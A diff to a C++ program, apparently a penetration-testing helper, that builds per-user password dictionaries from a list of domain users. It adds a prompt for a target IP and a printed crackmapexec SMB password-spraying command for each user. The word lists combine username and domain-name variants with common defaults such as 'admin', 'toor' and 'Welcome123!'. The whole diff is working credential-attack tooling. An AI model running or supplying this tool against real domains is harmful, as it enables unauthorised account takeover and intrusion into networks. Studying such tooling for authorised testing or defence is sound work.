@@ -10,7 +10,7 @@ int main(){
 	
 	fstream file;
 	
-	string domainName, computerName;
+	string domainName, computerName, ip;
 	
 	
 	string domainInfo[2], domainUsers[SIZE];
@@ -18,6 +18,9 @@ int main(){
 	char users[SIZE];
 	
 	file.open("users.txt", ios::in);
+	
+	cout << "IP: ";
+	cin >> ip;
 	
 	if (file.fail()){
 		cout << "Could not open users file"  << endl;
@@ -52,11 +55,13 @@ int main(){
 	int size = sizeof(domainUsers) / sizeof(domainUsers[0]);
 	
 	for (int i = 1; i < c; i++){
-		cout << "Test i: " << i << " SIZE: " << size << endl;
-		string payloadList[4] = {domainUsers[i], domainUsers[i] + "123", domainUsers[i] + "123$", domainUsers[i] + "$"};
+		//cout << "Test i: " << i << " SIZE: " << size << endl;
+		string payloadList[15] = {domainUsers[i], domainUsers[i] + "123", domainUsers[i] + "123$", domainUsers[i] + "$", "admin", "root", "toor", "administrator", "password", "pass123", domainInfo[0], domainInfo[1], domainInfo[0] + "123", domainInfo[1] + "123", "Welcome123!"};
 		fstream dictionary;
 		
 		dictionary.open(domainUsers[i] + ".txt", ios::out);
+		
+		cout << "crackmapexec smb " << ip << " -u " << domainUsers[i] << " -p " << domainUsers[i] + ".txt" << endl;
 		
 		if (dictionary.fail()){
 			cout << "Could not create dictionary!!" << endl;
@@ -68,8 +73,6 @@ int main(){
 		}
 		
 		dictionary.close();
-		
-		
 		
 	}
 	
